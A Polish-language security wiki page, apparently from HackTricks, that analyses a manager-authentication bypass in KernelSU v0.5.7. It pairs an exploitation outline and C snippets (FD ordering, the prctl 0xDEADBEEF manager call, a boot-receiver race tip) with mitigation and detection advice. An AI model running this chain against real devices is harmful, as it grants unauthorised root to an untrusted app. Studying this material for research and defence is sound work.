# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks, takie jak KernelSU, APatch i SKRoot, patchują lub hookują kernel Android/Linux i udostępniają uprzywilejowane funkcje nieuprzywilejowanej aplikacji managera w userspace. Magisk omówiono osobno poniżej, ponieważ CVE-2024-48336 dotyczyło ładowania kodu po stronie managera, a nie tej ścieżki syscall KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ta strona przedstawia w sposób abstrakcyjny techniki i problemy ujawnione w publicznych badaniach (w szczególności analizie KernelSU v0.5.7 przeprowadzonej przez Zimperium), aby pomóc zespołom red i blue zrozumieć powierzchnie ataku, primitives eksploatacji i skuteczne mechanizmy mitigacji.<sup>[[1]](#references)</sup>

---
## Wzorzec architektury: kanał managera z hookiem syscall

- W KernelSU v0.5.7 kernel hook na `prctl` odbiera magiczną wartość, ID polecenia i argumenty specyficzne dla polecenia z userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Wywołujący najpierw żąda statusu managera za pomocą `CMD_BECOME_MANAGER`. Autoryzacja jest specyficzna dla polecenia: `CMD_GRANT_ROOT` sprawdza stan managera/allowlisty, `CMD_ALLOW_SU` jest dostępne tylko dla managera, a `CMD_SET_SEPOLICY` w tej wersji jest dostępne tylko dla roota.<sup>[[2]](#references)[[11]](#references)</sup>
- Pozostałe polecenia odczytują wersję/konfigurację lub raportują zdarzenia frameworka.<sup>[[2]](#references)</sup>
- Ponieważ każda aplikacja może wywołać ten interfejs syscall, poprawność uwierzytelniania managera ma kluczowe znaczenie.<sup>[[1]](#references)[[2]](#references)</sup>

Przykład (design KernelSU):
- Hookowany syscall: prctl
- Magiczna wartość przekierowująca do handlera KernelSU: 0xDEADBEEF
- Polecenia obejmują: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT itd.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Przepływ uwierzytelniania KernelSU v0.5.7 (zgodnie z implementacją)

Gdy userspace wywołuje prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU weryfikuje:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Sprawdzenie prefiksu ścieżki
- Podana ścieżka musi zaczynać się od oczekiwanego prefiksu dla UID wywołującego, np. /data/data/<pkg> lub /data/user/<id>/<pkg>.
- Odwołanie: logika prefiksu ścieżki w core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Sprawdzenie własności
- Właścicielem ścieżki musi być UID wywołującego.
- Odwołanie: logika własności w core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Sprawdzenie sygnatury APK za pomocą skanowania tabeli FD
- Iteruj po otwartych deskryptorach plików procesu wywołującego w rosnącej kolejności deskryptorów.
- Dla każdego zwykłego pliku, którego ścieżka zaczyna się od `/data/app/` i kończy na `/base.apk`, wymagaj, aby ścieżka zawierała substring pakietu wyprowadzony z podanej ścieżki katalogu danych.
- Zweryfikuj sygnaturę pierwszego kandydata spełniającego te kontrole ścieżki.
- Przeanalizuj sygnaturę APK v2 i zweryfikuj ją względem oficjalnego certyfikatu managera.
- Odwołania: manager.c (iterowanie po FD), apk_sign.c (weryfikacja APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Jeśli wszystkie kontrole zakończą się powodzeniem, kernel tymczasowo zapisuje UID managera w cache; polecenia dostępne tylko dla managera akceptują następnie ten UID, podczas gdy pozostałe polecenia zachowują własny UID lub kontrole allowlisty.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Klasa podatności: ufanie wyborowi APK opartemu na ścieżce

KernelSU v0.5.7 nie wiąże wyniku weryfikacji sygnatury z tożsamością zainstalowanego pakietu ustaloną przez PackageManager. W `manager.c` test pakietu jest wyłącznie sprawdzeniem substringu ścieżki (`strstr(cwd, pkg)`); następnie weryfikowana jest sygnatura pierwszego kandydata spełniającego ten test. Atakujący może więc umieścić prawdziwy manager APK w ścieżce `/data/app/`, która zawiera również nazwę pakietu atakującego, i doprowadzić do wybrania go jako pierwszego.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

To zaufanie pośrednie pozwala nieuprzywilejowanej aplikacji podszyć się pod managera bez posiadania klucza podpisującego managera.<sup>[[1]](#references)</sup>

Kluczowe wykorzystane właściwości:<sup>[[1]](#references)[[3]](#references)</sup>
- Skanowanie FD odbywa się według indeksu deskryptora, a sprawdzenie pakietu jest testem substringu ścieżki, a nie zweryfikowanym powiązaniem tożsamości pakietu z APK.
- open() zwraca najniższy dostępny FD. Zamykając najpierw deskryptory o niższych numerach, atakujący może kontrolować kolejność.
- Dołączony manager APK może zostać umieszczony w `/data/app/` w ścieżce zawierającej string pakietu atakującego, przy zachowaniu oficjalnej sygnatury managera.

---
## Warunki wstępne ataku

Konkretny przypadek KernelSU v0.5.7 wymaga:<sup>[[1]](#references)[[3]](#references)</sup>

- Urządzenie jest już zrootowane za pomocą podatnego rooting framework (np. KernelSU v0.5.7).
- Atakujący może lokalnie uruchamiać dowolny nieuprzywilejowany kod (proces aplikacji Android).
- W implementacji v0.5.7 `current->real_parent` musi mieć UID 0 (komentarz w kodzie opisuje to jako wymaganie bezpośredniego dziecka zygote); `manager.c` odrzuca inne procesy nadrzędne.<sup>[[3]](#references)</sup>
- Prawdziwy manager nie został jeszcze uwierzytelniony (np. bezpośrednio po restarcie). Niektóre frameworki zapisują UID managera w cache po pomyślnym uwierzytelnieniu; musisz wygrać wyścig.<sup>[[1]](#references)</sup>

---
## Zarys eksploatacji (KernelSU v0.5.7)

Kroki wysokiego poziomu (film demonstracyjny d pokazuje publiczny proof of concept w działaniu):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Zbuduj prawidłową ścieżkę do własnego katalogu danych aplikacji, aby spełnić kontrole prefiksu i własności.
2) Umieść prawdziwy KernelSU Manager base.apk w `/data/app/` w ścieżce zawierającej string pakietu, a następnie otwórz go na FD o niższym numerze niż FD własnego base.apk.
3) Wywołaj prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...), aby przejść kontrole.
4) Użyj `CMD_GRANT_ROOT`, następnie `CMD_ALLOW_SU` dla trwałego su; wywołuj przeznaczone tylko dla roota `CMD_SET_SEPOLICY` dopiero po uzyskaniu roota i tylko tam, gdzie jest obsługiwane.

Uwagi praktyczne dotyczące kroku 2 (kolejność FD):<sup>[[1]](#references)</sup>
- Ustal FD własnego procesu wskazujący na własny /data/app/*/base.apk, przechodząc po symlinkach /proc/self/fd.
- Zamknij FD o niskim numerze (np. stdin, fd 0) i otwórz najpierw prawdziwy manager APK, aby zajął fd 0 (lub dowolny indeks niższy niż FD własnego base.apk).
- Dołącz prawdziwy manager APK do swojej aplikacji, aby jego ścieżka zaczynała się od `/data/app/`, kończyła na `/base.apk` i zawierała string pakietu. Na przykład ścieżka w katalogu `lib` aplikacji może spełnić te kontrole.<sup>[[1]](#references)[[3]](#references)</sup>

Przykładowe fragmenty kodu (Android/Linux, wyłącznie ilustracyjne):

Wylicz otwarte FD, aby znaleźć wpisy base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Wymuś, aby deskryptor pliku o niższym numerze wskazywał na prawidłowy plik APK managera:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uwierzytelnianie managera za pośrednictwem hooka `prctl` KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Po powodzeniu, uprzywilejowane commands (przykłady):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promuje bieżący proces do root
- CMD_ALLOW_SU: dodaje Twój package/UID do allowlist dla trwałego su
- CMD_SET_SEPOLICY: dostosowuje politykę SELinux po uzyskaniu root; KernelSU v0.5.7 sprawdza UID 0 dla tego command.<sup>[[2]](#references)</sup>

Wskazówka dotycząca race/persistence:
- Zarejestruj receiver BOOT_COMPLETED w AndroidManifest (`RECEIVE_BOOT_COMPLETED`), aby uruchamiać się po restarcie i próbować uwierzytelnienia przed prawdziwym managerem; permission zezwala na odbiór `ACTION_BOOT_COMPLETED`, ale sama nie gwarantuje priorytetu planowania.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Wskazówki dotyczące wykrywania i mitigacji

Dla developerów frameworków:
- Powiąż uwierzytelnianie z package/UID wywołującego, a nie z arbitralnymi FD:
- Ustal package wywołującego na podstawie jego UID i zweryfikuj go względem signature zainstalowanego package (za pośrednictwem PackageManager), zamiast skanować FD.
- Jeśli działasz wyłącznie w kernelu, użyj stabilnej tożsamości wywołującego (task creds) i przeprowadzaj walidację na stabilnym źródle prawdy zarządzanym przez init/helper w userspace, a nie przez FD procesów.
- Unikaj sprawdzania prefiksu ścieżki jako tożsamości; wywołujący może je trywialnie spełnić.
- Użyj challenge–response opartego na nonce przez kanał i usuwaj wszelką zcache’owaną tożsamość managera podczas boot lub po kluczowych zdarzeniach.
- Jeśli to możliwe, rozważ uwierzytelnianie IPC oparte na binderze zamiast przeciążania generic syscalls.

Dla defenderów/blue team:
- Wykrywaj obecność rooting frameworks i procesów managerów; monitoruj wywołania prctl z podejrzanymi magic constants (np. 0xDEADBEEF), jeśli masz telemetry z kernela.<sup>[[1]](#references)[[11]](#references)</sup>
- W zarządzanych flotach blokuj lub sygnalizuj boot receivers z niezaufanych packages, które szybko próbują wykonywać uprzywilejowane commands managera po boot.
- Upewnij się, że urządzenia są zaktualizowane do załatanych wersji frameworków; unieważniaj zcache’owane ID managera po aktualizacji.

Ograniczenia ataku:<sup>[[1]](#references)[[2]](#references)</sup>
- Dotyczy wyłącznie urządzeń, które już są rooted przy użyciu podatnego frameworka.
- Zwykle wymaga rebootu/okna race, zanim prawidłowy manager przeprowadzi uwierzytelnienie (niektóre frameworki cache’ują UID managera do momentu resetu).

---
## Powiązane uwagi dotyczące frameworków

- Uwierzytelnianie oparte na haśle (np. historyczne buildy APatch/SKRoot) może być słabe, jeśli hasła można odgadnąć lub brute-force’ować albo walidacje zawierają błędy.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Uwierzytelnianie oparte na package/signature (np. KernelSU) jest z zasady silniejsze, ale musi wiązać się z rzeczywistym wywołującym, a nie z artefaktami wyprowadzonymi ze ścieżki i wybranymi podczas skanowania FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 dotyczyła buildów sprzed Canary 27007, które ładowały code z niezweryfikowanego package GMS, umożliwiając lokalnej aplikacji wykonanie code w aplikacji Magisk i eskalację do root bez interakcji użytkownika.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rooting całego zła: luki bezpieczeństwa, które mogłyby narazić Twoje urządzenie mobilne](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – checks uwierzytelniania w core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteracja FD, sprawdzanie package i wywołanie signature w manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – weryfikacja APK v2 w apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Projekt KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Zgłoszenie Magisk nr 8279 – weryfikacja, czy GMS jest aplikacją systemową](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Film demonstracyjny PoC KSU (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identyfikatory commands w ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
